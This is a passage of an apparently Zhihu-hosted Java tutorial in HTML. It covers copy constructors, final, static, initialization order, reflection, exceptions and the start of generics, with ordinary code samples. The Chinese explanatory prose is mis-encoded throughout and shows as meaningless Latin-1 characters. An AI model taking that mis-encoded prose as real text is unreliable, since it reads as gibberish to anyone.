class=\"n\">2</span></code></pre></div><p><b>4. clone() çš„æ›¿ä»£æ–¹æ¡ˆ</b> </p><p>ä½¿ç”¨ clone() æ–¹æ³•æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡å³å¤æ‚åˆæœ‰é£é™©ï¼Œå®ƒä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶ä¸”è¿˜éœ€è¦ç±»å‹è½¬æ¢ã€‚Effective Java ä¹¦ä¸Šè®²åˆ°ï¼Œæœ€å¥½ä¸è¦å»ä½¿ç”¨ clone()ï¼Œå¯ä»¥ä½¿ç”¨æ‹·è´æ„é€ å‡½æ•°æˆ–è€…æ‹·è´å·¥å‚æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneConstructorExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">CloneConstructorExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">CloneConstructorExample</span><span class=\"o\">(</span><span class=\"n\">CloneConstructorExample</span> <span class=\"n\">original</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneConstructorExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneConstructorExample</span><span class=\"o\">();</span>\n<span class=\"n\">CloneConstructorExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneConstructorExample</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">);</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span class=\"n\">2</span></code></pre></div><h2>å…­ã€å…³é”®å­—</h2><h2>final</h2><p><b>1. æ•°æ®</b> </p><p>å£°æ˜æ•°æ®ä¸ºå¸¸é‡ï¼Œå¯ä»¥æ˜¯ç¼–è¯‘æ—¶å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯åœ¨è¿è¡Œæ—¶è¢«åˆå§‹åŒ–åä¸èƒ½è¢«æ”¹å˜çš„å¸¸é‡ã€‚</p><ul><li>å¯¹äºåŸºæœ¬ç±»å‹ï¼Œfinal ä½¿æ•°å€¼ä¸å˜ï¼›</li><li>å¯¹äºå¼•ç”¨ç±»å‹ï¼Œfinal ä½¿å¼•ç”¨ä¸å˜ï¼Œä¹Ÿå°±ä¸èƒ½å¼•ç”¨å…¶å®ƒå¯¹è±¡ï¼Œä½†æ˜¯è¢«å¼•ç”¨çš„å¯¹è±¡æœ¬èº«æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"c1\">// x = 2;  // cannot assign value to final variable &#39;x&#39;\n</span><span class=\"c1\"></span><span class=\"kd\">final</span> <span class=\"n\">A</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n<span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span></code></pre></div><p><b>2. æ–¹æ³•</b> </p><p>å£°æ˜æ–¹æ³•ä¸èƒ½è¢«å­ç±»é‡å†™ã€‚</p><p>private æ–¹æ³•éšå¼åœ°è¢«æŒ‡å®šä¸º finalï¼Œå¦‚æœåœ¨å­ç±»ä¸­å®šä¹‰çš„æ–¹æ³•å’ŒåŸºç±»ä¸­çš„ä¸€ä¸ª private æ–¹æ³•ç­¾åç›¸åŒï¼Œæ­¤æ—¶å­ç±»çš„æ–¹æ³•ä¸æ˜¯é‡å†™åŸºç±»æ–¹æ³•ï¼Œè€Œæ˜¯åœ¨å­ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</p><p><b>3. ç±»</b> </p><p>å£°æ˜ç±»ä¸å…è®¸è¢«ç»§æ‰¿ã€‚</p><h2>static</h2><p><b>1. é™æ€å˜é‡</b> </p><ul><li>é™æ€å˜é‡ï¼šåˆç§°ä¸ºç±»å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå˜é‡å±äºç±»çš„ï¼Œç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å…±äº«é™æ€å˜é‡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ç±»åæ¥è®¿é—®å®ƒã€‚é™æ€å˜é‡åœ¨å†…å­˜ä¸­åªå­˜åœ¨ä¸€ä»½ã€‚</li><li>å®ä¾‹å˜é‡ï¼šæ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹å°±ä¼šäº§ç”Ÿä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå®ƒä¸è¯¥å®ä¾‹åŒç”Ÿå…±æ­»ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>         <span class=\"c1\">// å®ä¾‹å˜é‡\n</span><span class=\"c1\"></span>    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>  <span class=\"c1\">// é™æ€å˜é‡\n</span><span class=\"c1\"></span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// int x = A.x;  // Non-static field &#39;x&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"n\">A</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">.</span><span class=\"na\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>2. é™æ€æ–¹æ³•</b> </p><p>é™æ€æ–¹æ³•åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±å­˜åœ¨äº†ï¼Œå®ƒä¸ä¾èµ–äºä»»ä½•å®ä¾‹ã€‚æ‰€ä»¥é™æ€æ–¹æ³•å¿…é¡»æœ‰å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æ˜¯æŠ½è±¡æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">(){</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// public abstract static void func2();  // Illegal combination of modifiers: &#39;abstract&#39; and &#39;static&#39;\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p>åªèƒ½è®¿é—®æ‰€å±ç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼Œæ–¹æ³•ä¸­ä¸èƒ½æœ‰ this å’Œ super å…³é”®å­—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">(){</span>\n        <span class=\"kt\">int</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"c1\">// int b = y;  // Non-static field &#39;y&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"c1\">// int b = this.y;     // &#39;A.this&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>3. é™æ€è¯­å¥å—</b> </p><p>é™æ€è¯­å¥å—åœ¨ç±»åˆå§‹åŒ–æ—¶è¿è¡Œä¸€æ¬¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">static</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;123&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">A</span> <span class=\"n\">a1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"n\">A</span> <span class=\"n\">a2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">123</span></code></pre></div><p><b>4. é™æ€å†…éƒ¨ç±»</b> </p><p>éé™æ€å†…éƒ¨ç±»ä¾èµ–äºå¤–éƒ¨ç±»çš„å®ä¾‹ï¼Œè€Œé™æ€å†…éƒ¨ç±»ä¸éœ€è¦ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">OuterClass</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">class</span> <span class=\"nc\">InnerClass</span> <span class=\"o\">{</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">StaticInnerClass</span> <span class=\"o\">{</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// InnerClass innerClass = new InnerClass(); // &#39;OuterClass.this&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"n\">OuterClass</span> <span class=\"n\">outerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">OuterClass</span><span class=\"o\">();</span>\n        <span class=\"n\">InnerClass</span> <span class=\"n\">innerClass</span> <span class=\"o\">=</span> <span class=\"n\">outerClass</span><span class=\"o\">.</span><span class=\"na\">new</span> <span class=\"nf\">InnerClass</span><span class=\"o\">();</span>\n        <span class=\"n\">StaticInnerClass</span> <span class=\"n\">staticInnerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StaticInnerClass</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>é™æ€å†…éƒ¨ç±»ä¸èƒ½è®¿é—®å¤–éƒ¨ç±»çš„éé™æ€çš„å˜é‡å’Œæ–¹æ³•ã€‚</p><p><b>5. é™æ€å¯¼åŒ…</b> </p><p>åœ¨ä½¿ç”¨é™æ€å˜é‡å’Œæ–¹æ³•æ—¶ä¸ç”¨å†æŒ‡æ˜ ClassNameï¼Œä»è€Œç®€åŒ–ä»£ç ï¼Œä½†å¯è¯»æ€§å¤§å¤§é™ä½ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kn\">import static</span> <span class=\"nn\">com.xxx.ClassName.*</span></code></pre></div><p><b>6. åˆå§‹åŒ–é¡ºåº</b> </p><p>é™æ€å˜é‡å’Œé™æ€è¯­å¥å—ä¼˜å…ˆäºå®ä¾‹å˜é‡å’Œæ™®é€šè¯­å¥å—ï¼Œé™æ€å˜é‡å’Œé™æ€è¯­å¥å—çš„åˆå§‹åŒ–é¡ºåºå–å†³äºå®ƒä»¬åœ¨ä»£ç ä¸­çš„é¡ºåºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">String</span> <span class=\"n\">staticField</span> <span class=\"o\">=</span> <span class=\"s\">&#34;é™æ€å˜é‡&#34;</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;é™æ€è¯­å¥å—&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"n\">field</span> <span class=\"o\">=</span> <span class=\"s\">&#34;å®ä¾‹å˜é‡&#34;</span><span class=\"o\">;</span>\n<span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;æ™®é€šè¯­å¥å—&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>æœ€åæ‰æ˜¯æ„é€ å‡½æ•°çš„åˆå§‹åŒ–ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"nf\">InitialOrderTest</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;æ„é€ å‡½æ•°&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>å­˜åœ¨ç»§æ‰¿çš„æƒ…å†µä¸‹ï¼Œåˆå§‹åŒ–é¡ºåºä¸ºï¼š</p><ul><li>çˆ¶ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</li><li>å­ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</li><li>çˆ¶ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</li><li>çˆ¶ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</li><li>å­ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</li><li>å­ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</li></ul><h2>ä¸ƒã€åå°„</h2><p>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª  <b>Class</b>  å¯¹è±¡ï¼ŒåŒ…å«äº†ä¸ç±»æœ‰å…³çš„ä¿¡æ¯ã€‚å½“ç¼–è¯‘ä¸€ä¸ªæ–°ç±»æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªåŒåçš„ .class æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…å®¹ä¿å­˜ç€ Class å¯¹è±¡ã€‚</p><p>ç±»åŠ è½½ç›¸å½“äº Class å¯¹è±¡çš„åŠ è½½ï¼Œç±»åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰åŠ¨æ€åŠ è½½åˆ° JVM ä¸­ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>Class.forName(&#34;com.mysql.jdbc.Driver&#34;)</code> è¿™ç§æ–¹å¼æ¥æ§åˆ¶ç±»çš„åŠ è½½ï¼Œè¯¥æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Class å¯¹è±¡ã€‚</p><p>åå°„å¯ä»¥æä¾›è¿è¡Œæ—¶çš„ç±»ä¿¡æ¯ï¼Œå¹¶ä¸”è¿™ä¸ªç±»å¯ä»¥åœ¨è¿è¡Œæ—¶æ‰åŠ è½½è¿›æ¥ï¼Œç”šè‡³åœ¨ç¼–è¯‘æ—¶æœŸè¯¥ç±»çš„ .class ä¸å­˜åœ¨ä¹Ÿå¯ä»¥åŠ è½½è¿›æ¥ã€‚</p><p>Class å’Œ java.lang.reflect ä¸€èµ·å¯¹åå°„æä¾›äº†æ”¯æŒï¼Œjava.lang.reflect ç±»åº“ä¸»è¦åŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªç±»ï¼š</p><ul><li><b>Field</b> ï¼šå¯ä»¥ä½¿ç”¨ get() å’Œ set() æ–¹æ³•è¯»å–å’Œä¿®æ”¹ Field å¯¹è±¡å…³è”çš„å­—æ®µï¼›</li><li><b>Method</b> ï¼šå¯ä»¥ä½¿ç”¨ invoke() æ–¹æ³•è°ƒç”¨ä¸ Method å¯¹è±¡å…³è”çš„æ–¹æ³•ï¼›</li><li><b>Constructor</b> ï¼šå¯ä»¥ç”¨ Constructor åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚</li></ul><p><b>åå°„çš„ä¼˜ç‚¹ï¼š</b> </p><ul><li><b>å¯æ‰©å±•æ€§</b>  ï¼šåº”ç”¨ç¨‹åºå¯ä»¥åˆ©ç”¨å…¨é™å®šååˆ›å»ºå¯æ‰©å±•å¯¹è±¡çš„å®ä¾‹ï¼Œæ¥ä½¿ç”¨æ¥è‡ªå¤–éƒ¨çš„ç”¨æˆ·è‡ªå®šä¹‰ç±»ã€‚</li><li><b>ç±»æµè§ˆå™¨å’Œå¯è§†åŒ–å¼€å‘ç¯å¢ƒ</b>  ï¼šä¸€ä¸ªç±»æµè§ˆå™¨éœ€è¦å¯ä»¥æšä¸¾ç±»çš„æˆå‘˜ã€‚å¯è§†åŒ–å¼€å‘ç¯å¢ƒï¼ˆå¦‚ IDEï¼‰å¯ä»¥ä»åˆ©ç”¨åå°„ä¸­å¯ç”¨çš„ç±»å‹ä¿¡æ¯ä¸­å—ç›Šï¼Œä»¥å¸®åŠ©ç¨‹åºå‘˜ç¼–å†™æ­£ç¡®çš„ä»£ç ã€‚</li><li><b>è°ƒè¯•å™¨å’Œæµ‹è¯•å·¥å…·</b>  ï¼š è°ƒè¯•å™¨éœ€è¦èƒ½å¤Ÿæ£€æŸ¥ä¸€ä¸ªç±»é‡Œçš„ç§æœ‰æˆå‘˜ã€‚æµ‹è¯•å·¥å…·å¯ä»¥åˆ©ç”¨åå°„æ¥è‡ªåŠ¨åœ°è°ƒç”¨ç±»é‡Œå®šä¹‰çš„å¯è¢«å‘ç°çš„ API å®šä¹‰ï¼Œä»¥ç¡®ä¿ä¸€ç»„æµ‹è¯•ä¸­æœ‰è¾ƒé«˜çš„ä»£ç è¦†ç›–ç‡ã€‚</li></ul><p><b>åå°„çš„ç¼ºç‚¹ï¼š</b> </p><p>å°½ç®¡åå°„éå¸¸å¼ºå¤§ï¼Œä½†ä¹Ÿä¸èƒ½æ»¥ç”¨ã€‚å¦‚æœä¸€ä¸ªåŠŸèƒ½å¯ä»¥ä¸ç”¨åå°„å®Œæˆï¼Œé‚£ä¹ˆæœ€å¥½å°±ä¸ç”¨ã€‚åœ¨æˆ‘ä»¬ä½¿ç”¨åå°„æŠ€æœ¯æ—¶ï¼Œä¸‹é¢å‡ æ¡å†…å®¹åº”è¯¥ç‰¢è®°äºå¿ƒã€‚</p><ul><li><b>æ€§èƒ½å¼€é”€</b>  ï¼šåå°„æ¶‰åŠäº†åŠ¨æ€ç±»å‹çš„è§£æï¼Œæ‰€ä»¥ JVM æ— æ³•å¯¹è¿™äº›ä»£ç è¿›è¡Œä¼˜åŒ–ã€‚å› æ­¤ï¼Œåå°„æ“ä½œçš„æ•ˆç‡è¦æ¯”é‚£äº›éåå°„æ“ä½œä½å¾—å¤šã€‚æˆ‘ä»¬åº”è¯¥é¿å…åœ¨ç»å¸¸è¢«æ‰§è¡Œçš„ä»£ç æˆ–å¯¹æ€§èƒ½è¦æ±‚å¾ˆé«˜çš„ç¨‹åºä¸­ä½¿ç”¨åå°„ã€‚<br/> </li><li><b>å®‰å…¨é™åˆ¶</b>  ï¼šä½¿ç”¨åå°„æŠ€æœ¯è¦æ±‚ç¨‹åºå¿…é¡»åœ¨ä¸€ä¸ªæ²¡æœ‰å®‰å…¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œã€‚å¦‚æœä¸€ä¸ªç¨‹åºå¿…é¡»åœ¨æœ‰å®‰å…¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œå¦‚ Appletï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸ªé—®é¢˜äº†ã€‚<br/> </li><li><b>å†…éƒ¨æš´éœ²</b>  ï¼šç”±äºåå°„å…è®¸ä»£ç æ‰§è¡Œä¸€äº›åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¸è¢«å…è®¸çš„æ“ä½œï¼ˆæ¯”å¦‚è®¿é—®ç§æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨åå°„å¯èƒ½ä¼šå¯¼è‡´æ„æ–™ä¹‹å¤–çš„å‰¯ä½œç”¨ï¼Œè¿™å¯èƒ½å¯¼è‡´ä»£ç åŠŸèƒ½å¤±è°ƒå¹¶ç ´åå¯ç§»æ¤æ€§ã€‚åå°„ä»£ç ç ´åäº†æŠ½è±¡æ€§ï¼Œå› æ­¤å½“å¹³å°å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œä»£ç çš„è¡Œä¸ºå°±æœ‰å¯èƒ½ä¹Ÿéšç€å˜åŒ–ã€‚<br/> </li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/reflect/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Trail: The Reflection API</a><br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.sczyh30.com/posts/Java/java-reflection-1/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥è§£æ Java åå°„ï¼ˆ1ï¼‰- åŸºç¡€</a></li></ul><h2>å…«ã€å¼‚å¸¸</h2><p>Throwable å¯ä»¥ç”¨æ¥è¡¨ç¤ºä»»ä½•å¯ä»¥ä½œä¸ºå¼‚å¸¸æŠ›å‡ºçš„ç±»ï¼Œåˆ†ä¸ºä¸¤ç§ï¼š <b>Error</b>  å’Œ <b>Exception</b>ã€‚å…¶ä¸­ Error ç”¨æ¥è¡¨ç¤º JVM æ— æ³•å¤„ç†çš„é”™è¯¯ï¼ŒException åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li><b>å—æ£€å¼‚å¸¸</b> ï¼šéœ€è¦ç”¨ try...catch... è¯­å¥æ•è·å¹¶è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”å¯ä»¥ä»å¼‚å¸¸ä¸­æ¢å¤ï¼›</li><li><b>éå—æ£€å¼‚å¸¸</b> ï¼šæ˜¯ç¨‹åºè¿è¡Œæ—¶é”™è¯¯ï¼Œä¾‹å¦‚é™¤ 0 ä¼šå¼•å‘ Arithmetic Exceptionï¼Œæ­¤æ—¶ç¨‹åºå´©æºƒå¹¶ä¸”æ— æ³•æ¢å¤ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-118d84b4bc7e732e5592961c122c25da_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"2272\" class=\"origin_image zh-lightbox-thumb\" width=\"4096\" data-original=\"https://pic3.zhimg.com/v2-118d84b4bc7e732e5592961c122c25da_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;4096&#39; height=&#39;2272&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"2272\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"4096\" data-original=\"https://pic3.zhimg.com/v2-118d84b4bc7e732e5592961c122c25da_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-118d84b4bc7e732e5592961c122c25da_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//www.tianmaying.com/tutorial/Java-Exception\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java å…¥é—¨ä¹‹å¼‚å¸¸å¤„ç†</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/7383.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java å¼‚å¸¸çš„é¢è¯•é—®é¢˜åŠç­”æ¡ˆ -Part 1</a></li></ul><h2>ä¹ã€æ³›å‹</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Box</span><span class=\"o\">&lt;</span><span class=\"n\">T</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// T stands for &#34;Type&#34;\n</span><span class=\"c1\"></span>    <span class=\"kd\">private</span> <span class=\"n\">T</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span 